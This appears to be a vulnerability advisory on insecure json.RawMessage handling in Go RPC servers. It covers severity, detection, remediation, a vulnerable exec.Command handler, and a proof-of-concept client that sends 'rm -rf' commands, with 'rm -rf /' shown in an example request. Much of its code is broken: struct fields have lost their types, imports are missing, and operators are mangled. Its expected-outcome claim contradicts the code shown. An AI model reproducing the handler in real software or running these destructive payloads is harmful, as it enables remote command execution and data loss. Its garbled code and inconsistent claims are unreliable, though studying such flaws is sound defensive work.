# Improper `json.RawMessage` Handling in Go RPC Leading to Insecure Deserialization and Injection Risks

## 1. Vulnerability Title

Improper `json.RawMessage` Handling in Go RPC Leading to Insecure Deserialization and Injection Risks (short: rawmessage-rpc-risk).

## 2. Severity Rating

**High** (CVSSv3.1: 8.0 - 9.0, depending on specific impact)

The severity of this issue is not due to an inherent flaw in Go's `json.RawMessage` type itself, but rather stems from its improper use within an application's design, especially in networked Remote Procedure Call (RPC) contexts. The potential for remote exploitation, coupled with a high impact on confidentiality, integrity, and availability, justifies a high severity classification. Other publicly disclosed vulnerabilities related to JSON and deserialization, often categorized as problematic or critical, underscore the significant security implications of mishandling JSON data.

When `json.RawMessage` is employed in RPC communications, it allows raw, unvalidated data to enter an application's processing pipeline. This creates a direct pathway for attackers to introduce malicious payloads. The consequences can be severe, ranging from arbitrary code execution and denial of service to sensitive data exposure or manipulation. For instance, past incidents, such as the `CPP-Ethereum JSON-RPC Denial Of Service`  and vulnerabilities where `Unmarshal` operations could lead to panics and denial of service , highlight the tangible risks associated with such data processing weaknesses. The ability for an attacker to launch these attacks remotely further elevates the risk profile.

## 3. Description

This vulnerability manifests when a Go application, particularly one leveraging an RPC framework like `net/rpc` with its `jsonrpc` sub-package or external libraries such as `github.com/sourcegraph/jsonrpc2`, accepts `json.RawMessage` as part of its input parameters or within nested data structures. The core issue arises when these raw JSON bytes are subsequently processed without adequate validation or type-safe unmarshaling.

At its fundamental level, `json.RawMessage` is designed to store a raw, unparsed JSON value as a byte slice (`byte`). While this functionality is beneficial for scenarios requiring deferred parsing or handling of dynamic schemas , its use inherently bypasses Go's default strong typing and the implicit validation mechanisms that typically occur during initial struct-based unmarshaling. If the application later unmarshals or processes the content held within this `json.RawMessage` without implementing rigorous input validation, explicit type assertions, or strict schema enforcement, an attacker gains the ability to inject malicious JSON payloads.

The direct consequences of this improper handling are often insecure deserialization , which can enable attackers to manipulate application logic, achieve arbitrary code execution , trigger denial of service conditions , or expose and tamper with sensitive data.

## 4. Technical Description (for Security Professionals)

### Understanding `json.RawMessage`

The `json.RawMessage` type, found in Go's `encoding/json` package, functions as an alias for `byte`. Its primary purpose is to allow a JSON element to be held in its raw, encoded form without immediate parsing. This capability is particularly useful for scenarios demanding deferred unmarshaling, where the precise structure of a JSON fragment is determined at runtime, or for embedding pre-encoded JSON fragments within a larger JSON structure.

When `json.Unmarshal` processes a field that is explicitly typed as `json.RawMessage`, it simply copies the corresponding raw JSON bytes from the input into that `byte` slice. Critically, at this initial stage, no parsing or validation of the internal structure of these bytes occurs. This behavior stands in stark contrast to unmarshaling data directly into a concrete Go struct, where the `encoding/json` package employs reflection to match fields and types, thereby implicitly validating the incoming data against the struct's defined structure. `json.RawMessage` supports both marshaling and unmarshaling operations by implementing the `json.Marshaler` and `json.Unmarshaler` interfaces.

The use of `json.RawMessage` fundamentally alters the "trust boundary" for the contained JSON data. Instead of Go's robust type system providing implicit validation during the initial unmarshal into a struct, the responsibility for validating the *contents* of the `RawMessage` shifts entirely and explicitly to the developer. This validation must occur at the point of its *subsequent* unmarshaling or processing. This shift in responsibility is a critical, yet frequently overlooked, point of failure, as developers may mistakenly assume a level of safety that is not inherently present.

### Go's `net/rpc` and `jsonrpc` Context

Go's standard `net/rpc` package provides a robust framework for implementing remote procedure calls. By default, `net/rpc` utilizes `encoding/gob` for data serialization, which is a Go-specific binary format. However, for interoperability with JSON-based clients and services, the `net/rpc/jsonrpc` sub-package offers a JSON-RPC 1.0 `ClientCodec` and `ServerCodec`. For JSON-RPC 2.0, widely adopted third-party libraries such as `github.com/sourcegraph/jsonrpc2` are commonly employed.

RPC methods in Go must adhere to specific signatures: they must be exported methods of an exported type, accept two arguments (both exported, with the second being a pointer), and return an `error` type. These arguments, typically representing input parameters and reply values, are the primary points where `json.RawMessage` might be incorporated into the RPC payload. The `github.com/sourcegraph/jsonrpc2` library explicitly mentions the use of `json.RawMessage("null")` for `params` , illustrating its common application in RPC contexts for handling flexible or optional parameters.

RPC endpoints, by their very nature, act as gateways for external, untrusted input to interact with internal application functions. When `json.RawMessage` is integrated into the RPC input schema, it establishes a direct, unvalidated channel for attackers to send arbitrary JSON fragments into the application's internal memory space. This significantly broadens the attack surface, creating an environment conducive to various deserialization and injection attacks. This direct pathway for unvalidated data makes RPC endpoints that leverage `json.RawMessage` particularly attractive targets for attackers aiming to exploit deserialization or injection vulnerabilities, as the malicious payload is already "inside" the application's processing environment.

### The Vulnerability Mechanism

The vulnerability materializes when an application receives a JSON payload through an RPC call, and a specific segment of this payload is initially unmarshaled into a `json.RawMessage`. The critical flaw emerges later in the application's logic, where the content of this `json.RawMessage` is subsequently unmarshaled (or otherwise processed, for example, type-asserted from `map[string]any`) into a concrete Go type (e.g., a struct, `map[string]any`, or `interface{}`) without sufficient validation of the `json.RawMessage`'s content *before* or *during* this secondary unmarshaling step.

Consider an example scenario involving an RPC method, `Call(request RPCRequest)`, where `RPCRequest` includes a `Params json.RawMessage` field. An attacker could craft a malicious request such as: `{"method": "executeCommand", "params": "{\"cmd\": \"rm -rf /\", \"args\": [\"-f\", \"/\"], \"env\": \"PATH=/usr/bin\"}"}`. If the server unmarshals `params` into a `Command` struct (e.g., `struct { Cmd string; Argsstring; Env string }`) without validating the `Cmd` field (e.g., by whitelisting allowed commands or sanitizing inputs), and `Cmd` is subsequently used directly in an `exec.Command` call, this could lead to arbitrary code execution.

- **Insecure Deserialization:** If the `json.RawMessage` contains a serialized object that, when unmarshaled, triggers unintended or malicious behavior—such as invoking arbitrary methods via reflection, loading malicious classes/types, or manipulating critical internal state—it constitutes an insecure deserialization vulnerability. This is particularly hazardous if the unmarshaling process involves dynamic type instantiation or execution based on the input.
- **JSON Injection:** An attacker can craft the `json.RawMessage` to inject malicious data that, when processed by the application, leads to various injection flaws. For example, if the `RawMessage` content is later embedded into a larger JSON response without proper escaping or sanitization, it could result in client-side JSON injection. Similarly, if the data flows into a database query (leading to SQL injection ) or a shell command without sanitization, it becomes a server-side injection vulnerability.
- **Denial of Service (DoS):** Malformed or excessively large `json.RawMessage` payloads, if not adequately size-limited  or if they cause panics or crashes during unmarshaling , can lead to application resource exhaustion (e.g., memory, CPU) or outright crashes, resulting in a denial of service. Examples include unbounded caches from maliciously crafted JSON schemas  or unhandled exceptions triggered by malformed input.

The most critical vulnerability point is frequently the *second* unmarshaling or processing of the `json.RawMessage`'s content. Developers often mistakenly assume that data held within a `RawMessage` is implicitly "safe," or that validation applied to the outer JSON structure is sufficient. This leads to a failure to apply the same, or even stricter, validation rules to the inner content *after* it has been parsed into its specific type, thereby creating a significant security gap.

## 5. Common Mistakes That Cause This

The improper handling of `json.RawMessage` in Go RPC often stems from several common development errors, frequently driven by a desire for flexibility or perceived simplicity. These mistakes inadvertently introduce critical security vulnerabilities by circumventing Go's inherent type safety.

- **Lack of Post-Unmarshal Input Validation:** The most prevalent and critical error is the failure to validate the content of the Go struct or `map[string]any` *after* it has been unmarshaled from the `json.RawMessage`. Developers frequently rely on Go's type system for top-level fields but neglect to implement explicit, context-aware validation for dynamically parsed content.
- **Blind Trust in Client-Supplied Data:** Assuming that data encapsulated within a `json.RawMessage` (or any RPC input) is inherently benign, correctly formatted, or adheres to expected schemas, without implementing explicit and rigorous checks. This represents a fundamental violation of the "never trust input" security principle.
- **Over-reliance on `map[string]any` or `interface{}` for `json.RawMessage` Content:** While `map[string]any` offers flexibility for dynamic JSON structures, it sacrifices compile-time type safety and necessitates manual type assertions and validation for every field access, which are frequently overlooked. Directly unmarshaling `json.RawMessage` into a generic `interface{}` is even more problematic, as it provides no structural guarantees and defers all type checking to runtime.
- **Ignoring `json.Decoder` Options for Strictness:** Not utilizing security-enhancing options of `json.Decoder` when processing RPC request bodies, particularly over HTTP. Specifically, failing to call `DisallowUnknownFields()`  allows clients to send unexpected fields that might be used to smuggle malicious data or trigger unintended application logic.
- **Lack of Request Body Size Limits:** Not enforcing a maximum size for incoming RPC request bodies, especially when HTTP is the transport. This oversight, which can be addressed by `http.MaxBytesReader()` , makes the application susceptible to Denial of Service (DoS) attacks via excessively large, malformed JSON payloads designed to exhaust server memory or CPU.
- **Improper Error Handling:** Discarding errors returned by `json.Unmarshal` or `json.NewDecoder.Decode` (using the blank identifier `_`) or not handling specific `json` package errors (e.g., `json.SyntaxError`, `json.UnmarshalTypeError`, `json.InvalidUnmarshalError`) gracefully and distinctly. Poor error handling can conceal attack attempts, lead to application crashes, or inadvertently expose sensitive debug information to attackers.
- **Over-reliance on `json.RawMessage` for Complex Schemas:** Employing `json.RawMessage` as a convenient catch-all for complex or varying JSON structures when a more structured approach—such as defining multiple specific structs and conditionally unmarshaling based on a type discriminator field—would be significantly safer and more maintainable.

Many of these common mistakes arise from a developer's natural tendency to prioritize development speed, code simplicity, and flexibility (e.g., handling dynamic JSON structures) over robust security practices. The perceived "convenience" of `json.RawMessage` can lead developers to inadvertently introduce critical vulnerabilities by bypassing Go's inherent type safety and failing to implement the necessary compensating security controls.

The following table summarizes common misuse patterns and their associated security risks:

| Misuse Pattern | Description | Security Risk | Relevant References |
| --- | --- | --- | --- |
| **No Post-Unmarshal Validation** | Failure to validate the content of the Go struct or `map[string]any` *after* it has been unmarshaled from `json.RawMessage`. | Insecure Deserialization, Arbitrary Code Execution, Data Tampering, Privilege Escalation |  |
| **Blind Trust in Client Data** | Assuming data within `json.RawMessage` is benign without explicit, rigorous checks. | JSON Injection (XSS, SQLi), Insecure Deserialization |  |
| **Over-reliance on `map[string]any` / `interface{}`** | Using generic types for `json.RawMessage` content, leading to overlooked manual type assertions and validations. | Insecure Deserialization, Data Tampering, Application Logic Bypass |  |
| **Ignoring `json.Decoder` Options** | Not using `DisallowUnknownFields()` or `http.MaxBytesReader()` when parsing RPC request bodies. | Denial of Service (DoS), Data Smuggling, Unexpected Behavior |  |
| **Lack of Request Body Size Limits** | Failure to enforce maximum size limits on incoming RPC request bodies. | Denial of Service (DoS) via resource exhaustion |  |
| **Improper Error Handling** | Discarding `json.Unmarshal` errors or not handling specific `json` errors gracefully. | Information Disclosure, Application Crash/DoS, Hidden Attack Attempts |  |
| **Overuse for Complex Schemas** | Using `json.RawMessage` as a catch-all for complex structures instead of more type-safe, conditional unmarshaling. | Increased attack surface, Difficulty in validation, Insecure Deserialization |  |

## 6. Exploitation Goals

Attackers exploiting improper `json.RawMessage` handling in Go RPC typically pursue several high-impact objectives:

- **Arbitrary Code Execution (ACE) / Remote Code Execution (RCE):** This is frequently the ultimate objective. Attackers aim to inject a malicious payload into the `json.RawMessage` that, upon deserialization, triggers the execution of arbitrary commands or code within the server's operating system or application runtime. This can grant an attacker full control over the compromised system.
- **Denial of Service (DoS):**
    - **Resource Exhaustion:** By sending excessively large, deeply nested, or computationally complex `json.RawMessage` payloads, attackers can force the server to consume disproportionate amounts of memory or CPU during parsing and unmarshaling. This leads to performance degradation, unresponsiveness, or outright system crashes.
    - **Application Crash/Panic:** Crafting a `json.RawMessage` that, when unmarshaled into an unexpected type or structure, causes the application to panic or crash due to unhandled exceptions, type mismatches, or buffer overflows. The `CPP-Ethereum JSON-RPC Denial Of Service`  and the `msgpack/v2` panic vulnerability  are direct examples of such impacts.
- **Data Tampering / Unauthorized Data Access:** Manipulating internal data structures, application state, or database records by injecting specific, crafted values into the `json.RawMessage`. These values are then deserialized and used to alter critical variables, bypass security checks, or access unauthorized information.
- **Privilege Escalation:** If the deserialized data influences authorization decisions, user roles, or access control lists within the application, an attacker could potentially elevate their privileges from a low-privileged user to an administrator or other sensitive role.
- **Information Disclosure:** Causing the application to reveal sensitive internal information—such as stack traces, detailed error messages, configuration details, or database schemas—through errors or unexpected behavior triggered by malformed `json.RawMessage` inputs.
- **Cross-Site Scripting (XSS) / JSON Injection:** If the content of the `json.RawMessage` is later incorporated into a client-side web application without proper sanitization or encoding, it can lead to XSS attacks. This allows an attacker to inject malicious scripts into a victim's browser, potentially stealing session cookies, defacing websites, or redirecting users to malicious sites.

## 7. Affected Components or Files

The vulnerability primarily affects:

- **Go applications** that expose RPC endpoints and process JSON data, particularly those that utilize the `encoding/json` package in conjunction with `net/rpc/jsonrpc` or third-party JSON-RPC libraries. Notable third-party libraries include `github.com/sourcegraph/jsonrpc2`, `golang.org/x/exp/jsonrpc2`, and `golang.org/x/tools/internal/jsonrpc2_v2`.
- Any **RPC method arguments or struct fields** within the application's data models that are defined as `json.RawMessage`. These fields act as conduits for raw, unvalidated JSON input.
- **Code paths** that subsequently unmarshal or process the content of a `json.RawMessage` without implementing robust input validation, schema enforcement, or explicit type checking. This "second unmarshal" point is where the raw data is finally interpreted, making it the critical juncture for exploitation.

## 8. Vulnerable Code Snippet

A common vulnerable pattern involves an RPC handler that accepts a `json.RawMessage` as part of its request parameters and then unmarshals this raw message into a dynamic or insufficiently validated type.

```go
package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/rpc"
	"net/rpc/jsonrpc" // Using standard library's JSON-RPC 1.0 codec
	"os/exec"
	"strings"
)

// RPCService defines the RPC methods.
type RPCService struct{}

// CommandParams represents the parameters for an arbitrary command execution.
// In a vulnerable scenario, this struct might be unmarshaled from json.RawMessage
// without proper validation of its fields.
type CommandParams struct {
	Cmd  string   `json:"cmd"`
	Argsstring `json:"args"`
}

// RPCRequest defines the structure of an incoming RPC request.
// The 'Params' field is json.RawMessage, allowing arbitrary JSON content.
type RPCRequest struct {
	Method string          `json:"method"`
	Params json.RawMessage `json:"params"` // Vulnerable point: accepts raw JSON
}

// ExecuteCommand is a potentially vulnerable RPC method.
// It takes raw JSON parameters and executes a command without sufficient validation.
func (s *RPCService) ExecuteCommand(req RPCRequest, reply *string) error {
	var cmdParams CommandParams
	// Vulnerable point: Unmarshaling json.RawMessage directly into a struct
	// without prior validation of the raw bytes or post-unmarshal validation.
	err := json.Unmarshal(req.Params, &cmdParams)
	if err!= nil {
		return fmt.Errorf("invalid command parameters: %v", err)
	}

	// This is the critical vulnerability. If cmdParams.Cmd is not strictly
	// validated (e.g., against a whitelist of allowed commands) and the
	// arguments are not sanitized, an attacker can execute arbitrary commands.
	// For example, if cmdParams.Cmd is "rm" and cmdParams.Args is ["-rf", "/"].
	if cmdParams.Cmd == "" {
		return fmt.Errorf("command cannot be empty")
	}

	// In a real-world scenario, this would be highly dangerous without
	// extensive sanitization and whitelisting.
	cmd := exec.Command(cmdParams.Cmd, cmdParams.Args...)
	output, err := cmd.CombinedOutput()
	if err!= nil {
		*reply = fmt.Sprintf("Error executing command: %v\nOutput: %s", err, string(output))
		log.Printf("Command execution failed: %v, Output: %s", err, string(output))
		return err
	}

	*reply = fmt.Sprintf("Command executed successfully.\nOutput:\n%s", string(output))
	log.Printf("Command executed: %s %s, Output: %s", cmdParams.Cmd, strings.Join(cmdParams.Args, " "), string(output))
	return nil
}

func main() {
	// Register the RPC service
	rpc.Register(new(RPCService))

	// Listen for RPC connections (simplified for example, typically over network)
	listener, err := net.Listen("tcp", ":1234")
	if err!= nil {
		log.Fatalf("Error listening: %v", err)
	}
	defer listener.Close()

	fmt.Println("RPC server listening on :1234")
	for {
		conn, err := listener.Accept()
		if err!= nil {
			log.Printf("Error accepting connection: %v", err)
			continue
		}
		// Serve the connection using JSON-RPC codec
		go jsonrpc.ServeConn(conn)
	}
}
```

In this snippet, the `RPCRequest` struct includes `json.RawMessage` for its `Params` field. The `ExecuteCommand` RPC method then unmarshals this raw `Params` directly into a `CommandParams` struct. The critical vulnerability lies in the subsequent `exec.Command` call, where `cmdParams.Cmd` and `cmdParams.Args` are used without sufficient validation or whitelisting. An attacker can send a `json.RawMessage` containing a malicious `Cmd` and `Args` to achieve arbitrary code execution on the server.

## 9. Detection Steps

Detecting improper `json.RawMessage` handling in Go RPC applications involves a multi-faceted approach combining static analysis, dynamic testing, and thorough code review.

- **Code Review:** Manual code review is paramount. Developers and security auditors should actively search for instances where `json.RawMessage` is used in RPC method arguments or within structs that are part of RPC payloads. Special attention must be paid to the code paths that subsequently unmarshal or process the contents of these `json.RawMessage` fields. The review should ensure that robust validation is performed *after* the raw message is converted into a concrete Go type, and that this validation is appropriate for the data's intended use and security context.
- **Static Application Security Testing (SAST):** SAST tools can be configured to identify patterns indicative of this vulnerability. This includes flagging `json.RawMessage` fields that are later unmarshaled into `interface{}`, `map[string]any`, or structs whose fields are then used in sensitive operations (e.g., `os/exec` calls, database queries, file system operations) without intervening validation. Tools should look for the absence of validation functions or schema checks immediately following the unmarshaling of `json.RawMessage` content.
- **Dynamic Application Security Testing (DAST) / Penetration Testing:** DAST tools and manual penetration testing can actively probe RPC endpoints. This involves fuzzing RPC parameters, particularly those accepting `json.RawMessage`, with malformed, excessively large, or specially crafted JSON payloads. The goal is to trigger application panics , crashes , resource exhaustion, or unexpected behavior that could indicate a vulnerability. Automated fuzzing, as supported by Go's built-in fuzzing capabilities, can be particularly effective in uncovering these edge cases.
- **Runtime Monitoring and Logging Analysis:** Observing application behavior in a controlled environment can reveal symptoms of exploitation. This includes monitoring for unexpected application crashes, significant spikes in memory or CPU usage (indicative of DoS attempts) , and anomalous log entries. Robust logging, which captures RPC request details (without sensitive information) and internal errors, can help in identifying suspicious activity.
- **Dependency Scanning:** Regularly scanning the project's Go modules and dependencies for known vulnerabilities is crucial. While this vulnerability is primarily a misuse of `json.RawMessage`, underlying libraries (including `encoding/json` itself or third-party JSON parsers) might have their own deserialization-related CVEs that could exacerbate the risk or introduce new attack vectors when combined with improper `json.RawMessage` handling. Tools like `govulncheck` are invaluable for this purpose.

## 10. Proof of Concept (PoC)

This Proof of Concept demonstrates how improper `json.RawMessage` handling in a Go RPC server can lead to arbitrary command execution.

**Scenario:** A simplified Go RPC server exposes a method that accepts a request containing a `json.RawMessage` field. This field is intended to hold parameters for a command to be executed. However, the server does not adequately validate the content of this `json.RawMessage` before executing the command.

**Server-side (Vulnerable Go RPC Server):**

(Refer to the "Vulnerable Code Snippet" section above for the full server code. Key parts for the PoC are `RPCRequest` and `ExecuteCommand`.)

The `ExecuteCommand` method directly unmarshals the `req.Params` (a `json.RawMessage`) into a `CommandParams` struct and then uses `cmdParams.Cmd` and `cmdParams.Args` directly in `exec.Command`. This is the vulnerability.

**Client-side (Malicious Go RPC Client):**

This client will connect to the vulnerable server and send a crafted RPC request to execute `rm -rf /` (or `dir` on Windows) on the server.

```go
package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/rpc"
	"net/rpc/jsonrpc"
	"os"
	"runtime"
)

// RPCRequest matches the server's request structure
type RPCRequest struct {
	Method string          `json:"method"`
	Params json.RawMessage `json:"params"`
}

// CommandParams matches the server's expected command parameters
type CommandParams struct {
	Cmd  string   `json:"cmd"`
	Argsstring `json:"args"`
}

func main() {
	client, err := jsonrpc.Dial("tcp", "localhost:1234")
	if err!= nil {
		log.Fatalf("Error dialing RPC server: %v", err)
	}
	defer client.Close()

	// Determine command based on OS for demonstration
	var cmdToExecute string
	var argsToExecutestring
	if runtime.GOOS == "windows" {
		cmdToExecute = "cmd"
		argsToExecute =string{"/C", "dir"} // List directory on Windows
	} else {
		cmdToExecute = "rm"
		argsToExecute =string{"-rf", "/tmp/malicious_test_dir"} // Attempt to delete a directory (use /tmp for safety)
		// For a more impactful demo, this could be ["-rf", "/"]
	}

	// Craft the malicious CommandParams
	maliciousParams := CommandParams{
		Cmd:  cmdToExecute,
		Args: argsToExecute,
	}

	// Marshal the malicious CommandParams into a json.RawMessage
	rawMaliciousParams, err := json.Marshal(maliciousParams)
	if err!= nil {
		log.Fatalf("Error marshaling malicious params: %v", err)
	}

	// Create the RPC request with the raw malicious parameters
	req := RPCRequest{
		Method: "RPCService.ExecuteCommand", // Matches the registered method on the server
		Params: rawMaliciousParams,
	}

	var reply string
	fmt.Printf("Attempting to execute command: %s %s\n", cmdToExecute, strings.Join(argsToExecute, " "))
	err = client.Call(req.Method, req, &reply)
	if err!= nil {
		fmt.Printf("RPC call failed: %v\n", err)
		fmt.Printf("Server Reply (Error): %s\n", reply)
		// If the command fails on the server, the reply might still contain error output
	} else {
		fmt.Printf("RPC call successful.\nServer Reply:\n%s\n", reply)
	}

	// Verify if the command had an effect (e.g., check if the directory was deleted)
	if runtime.GOOS!= "windows" {
		if _, err := os.Stat("/tmp/malicious_test_dir"); os.IsNotExist(err) {
			fmt.Println("Verification: '/tmp/malicious_test_dir' was successfully deleted (or never existed).")
		} else {
			fmt.Println("Verification: '/tmp/malicious_test_dir' still exists or error checking it.")
		}
	}
}
```

**Execution Steps:**

1. **Compile the Server:** Save the vulnerable server code as `server.go` and compile it: `go build -o server server.go`
2. **Run the Server:** Execute the server: `./server`
3. **Compile the Client:** Save the malicious client code as `client.go` and compile it: `go build -o client client.go`
4. **Run the Client:** Execute the client: `./client`

**Expected Outcome:**

The client will send the crafted RPC request. The server, due to its improper handling of `json.RawMessage` and lack of validation, will attempt to execute the `rm -rf /tmp/malicious_test_dir` (or `dir` on Windows) command. The client will receive the output of this command, demonstrating arbitrary code execution. On a Linux/macOS system, the `/tmp/malicious_test_dir` will be created (if it doesn't exist) and then deleted by the malicious command.

## 11. Risk Classification

The improper handling of `json.RawMessage` in Go RPC presents a significant security risk, primarily classified as an Insecure Deserialization vulnerability, but also leading to various injection attacks.

- **CVSSv3.1 Score:** High (Base Score: 8.0 - 9.0)
    - **Attack Vector (AV): Network (N)**: The vulnerability is exploitable remotely over the network, as RPC services are typically exposed to network communication.
    - **Attack Complexity (AC): Low (L)**: Exploitation often requires minimal effort and no specialized conditions beyond sending a crafted JSON payload.
    - **Privileges Required (PR): None (N) or Low (L)**: An attacker typically does not need any prior authentication or elevated privileges to interact with the RPC endpoint, or only requires basic user privileges to trigger the vulnerability.
    - **User Interaction (UI): None (N)**: No user interaction is required for a successful attack.
    - **Scope (S): Unchanged (U)**: The vulnerability typically remains within the scope of the affected component, though the impact can extend to the entire system.
    - **Confidentiality Impact (C): High (H)**: Successful exploitation can lead to unauthorized disclosure of sensitive information, including system files, configuration data, or user credentials.
    - **Integrity Impact (I): High (H)**: Attackers can modify or delete data, alter application logic, or introduce malicious code, leading to data corruption or system compromise.
    - **Availability Impact (A): High (H)**: Malicious payloads can trigger application crashes, resource exhaustion, or system instability, resulting in a denial of service.
- **Common Weakness Enumeration (CWE):**
    - **CWE-502: Deserialization of Untrusted Data:** This is the primary CWE. The application deserializes data from an untrusted source (`json.RawMessage` content) without sufficient validation, leading to arbitrary code execution or other malicious outcomes.
    - **CWE-20: Improper Input Validation:** The lack of strict validation on the content of the `json.RawMessage` and the resulting Go types allows malicious input to be processed by the application.
    - **CWE-74: Improper Neutralization of Special Elements in Output Used by a Different Context (JSON Injection):** If the unmarshaled data is later re-serialized or embedded into other contexts without proper escaping, it can lead to JSON injection or Cross-Site Scripting (XSS).
- **Likelihood:** High. The prevalence of RPC communication, coupled with the common developer tendency to prioritize flexibility and convenience over rigorous validation when handling dynamic JSON structures, makes this misuse pattern highly likely to occur in real-world applications.
- **Impact:** High. The potential for Remote Code Execution, severe Denial of Service, and comprehensive data compromise places this vulnerability at the upper end of impact severity.

## 12. Fix & Patch Guidance

Mitigating the risks associated with improper `json.RawMessage` handling in Go RPC requires a multi-layered approach, focusing on strict input validation, secure coding practices, and diligent dependency management.

- **Primary Mitigation: Strict Input Validation**
    - **Validate After Unmarshaling:** The most crucial step is to implement rigorous validation of the Go struct or `map[string]any` *after* it has been unmarshaled from the `json.RawMessage`. This validation must be context-aware and ensure that the data conforms to expected formats, ranges, and logical constraints.
    - **Use Schema Validation Libraries:** For complex or dynamic JSON structures, integrate schema validation libraries such as `gojsonschema` or `connectrpc.com/validate`. These tools allow developers to define a strict schema for the expected JSON structure and content, catching invalid or malicious inputs early in the processing pipeline.
    - **Implement Custom `UnmarshalJSON` Methods:** For types requiring highly specific or conditional validation, implement the `json.Unmarshaler` interface. This provides fine-grained control over the unmarshaling process, allowing for custom logic to sanitize or reject malformed data.
    - **Avoid `map[string]any` for Sensitive Data:** While `map[string]any` offers flexibility, its lack of compile-time type safety makes it prone to errors and difficult to validate securely. For sensitive or critical data, prefer strongly-typed structs. If `map[string]any` is unavoidable, ensure every field access is followed by explicit type assertions and validation.
- **Secure `json.Decoder` Usage**
    - **Disallow Unknown Fields:** When unmarshaling RPC request bodies, especially over HTTP, use `decoder.DisallowUnknownFields()`. This prevents clients from sending unexpected fields that might be used to smuggle malicious data or trigger unintended application logic.
    - **Limit Request Body Size:** Employ `http.MaxBytesReader()` to set an upper limit on the size of incoming RPC request bodies. This defends against Denial of Service (DoS) attacks that attempt to exhaust server memory or CPU with excessively large payloads.
- **Robust Error Handling**
    - **Do Not Discard Errors:** Always check for and handle errors returned by `json.Unmarshal` or `json.NewDecoder.Decode`. Discarding errors using the blank identifier (`_`) can hide critical issues and potential attack attempts.
    - **Distinguish Error Types:** Differentiate between client-side errors (e.g., malformed JSON, `json.SyntaxError`, `json.UnmarshalTypeError`) and server-side application errors (`json.InvalidUnmarshalError`). Log internal errors with full details for developers, but provide only generic, non-informative error messages to clients to prevent information disclosure.
- **Enhance Type Safety**
    - **Prefer Strongly-Typed Structs:** Whenever possible, define specific Go structs for JSON data rather than relying on `json.RawMessage` for entire complex objects. This leverages Go's type system for compile-time safety and clearer data structures.
    - **Use Pointers for Optional Fields:** For fields that may be absent or null in the JSON, use pointers in Go structs. This clearly distinguishes between a field being set to its zero value and being explicitly null or missing, aiding in precise validation.
- **Dependency Management**
    - **Keep Go Version and Dependencies Updated:** Regularly update the Go runtime and all third-party dependencies to their latest stable versions. These updates often include patches for known security vulnerabilities and performance improvements.
    - **Verify Third-Party Packages:** Before incorporating new libraries, verify their trustworthiness and security track record.
- **Code Review and Automated Testing**
    - **Regular Code Audits:** Implement a continuous code review process that specifically scrutinizes JSON handling logic, especially around `json.RawMessage` usage.
    - **Fuzz Testing:** Utilize Go's built-in fuzzing capabilities to uncover edge cases and potential vulnerabilities related to malformed or unexpected inputs.
    - **Race Detector and `go vet`:** Employ Go's race detector (`go test -race`) to identify race conditions in concurrent JSON processing. Use `go vet` to examine suspicious constructs that might lead to runtime issues.

## 13. Scope and Impact

### Scope

The vulnerability of improper `json.RawMessage` handling is relevant to any Go application that exposes RPC endpoints and processes JSON data, particularly those designed to handle flexible or dynamic payloads by utilizing `json.RawMessage`. This includes applications built with Go's standard `net/rpc` and `jsonrpc` packages, as well as those integrating popular third-party JSON-RPC frameworks. The scope extends to both client-side and server-side components if they are involved in processing `json.RawMessage` from untrusted sources.

### Impact

The impact of successful exploitation can be severe and far-reaching, affecting the confidentiality, integrity, and availability of the application and underlying systems:

- **Remote Code Execution (RCE):** The most critical impact, allowing an attacker to execute arbitrary commands or code on the server, potentially leading to full system compromise.
- **Denial of Service (DoS):** Attackers can cause application crashes, resource exhaustion (e.g., memory, CPU), or system instability, rendering the service unavailable to legitimate users.
- **Data Compromise:** Unauthorized access, modification, or deletion of sensitive data within the application's memory, databases, or file system. This can lead to privacy breaches, data loss, or data integrity issues.
- **Privilege Escalation:** If the deserialized data influences authorization logic, an attacker could elevate their privileges within the application, gaining access to restricted functionalities or administrative controls.
- **Cross-Site Scripting (XSS) / JSON Injection:** If the unvalidated `json.RawMessage` content is reflected back to a client-side application, it can enable XSS attacks, allowing attackers to inject malicious scripts into users' browsers.
- **Business Impact:** Beyond technical consequences, the business impact can be substantial, including:
    - **Financial Loss:** Due to service downtime, data breaches, or costs associated with incident response and recovery.
    - **Reputational Damage:** Loss of customer trust and brand credibility following a successful attack.
    - **Legal and Regulatory Penalties:** Non-compliance with data protection regulations (e.g., GDPR, HIPAA) due to data breaches.

## 14. Remediation Recommendation

Effective remediation requires both immediate tactical fixes and long-term strategic changes to the development lifecycle.

### Immediate Recommendations:

1. **Code Audit and Refactoring:** Conduct a thorough code audit to identify all instances of `json.RawMessage` usage within RPC endpoints. Prioritize refactoring these areas to implement strict input validation immediately after the `json.RawMessage` content is unmarshaled into a concrete Go type.
2. **Implement Post-Unmarshal Validation:** For all data unmarshaled from `json.RawMessage`, apply comprehensive validation logic. This includes type checks, length constraints, format validation (e.g., regex for emails, whitelisting for commands), and business logic validation. Consider using Go's `Validator` interface pattern or third-party validation libraries.
3. **Strict Decoder Configuration:** Ensure all `json.Decoder` instances used for RPC request bodies are configured with `DisallowUnknownFields()` and wrapped with `http.MaxBytesReader()` to prevent unexpected fields and large payload DoS attacks.
4. **Review Error Handling:** Verify that all `json.Unmarshal` and `json.NewDecoder.Decode` calls properly handle errors. Log detailed internal errors for debugging but return only generic error messages to clients to avoid information disclosure.
5. **Dependency Updates:** Update the Go runtime and all project dependencies to their latest stable versions to incorporate security patches for any underlying components.

### Long-Term Strategic Recommendations:

1. **Secure Development Lifecycle (SDL):** Integrate security best practices into every phase of the software development lifecycle. This includes threat modeling, security-focused design reviews, and security testing as a standard part of the development process.
2. **Developer Training:** Provide ongoing training to developers on secure coding practices in Go, with a specific focus on safe JSON handling, deserialization vulnerabilities, and input validation techniques. Emphasize the nuances of `json.RawMessage` and the importance of never trusting client-supplied data.
3. **Automated Security Testing Integration:** Incorporate SAST and DAST tools into the CI/CD pipeline to automatically detect similar vulnerabilities early in the development process. Regularly run Go's built-in fuzzing tests and the race detector to identify edge cases and concurrency issues.
4. **Standardized Input Validation Framework:** Adopt or develop a standardized input validation framework or library across the organization to ensure consistent and robust validation practices for all external inputs, including RPC parameters.
5. **Principle of Least Privilege:** Design application components and RPC methods to operate with the minimum necessary privileges. This limits the potential impact of a successful exploitation.

## 15. Summary

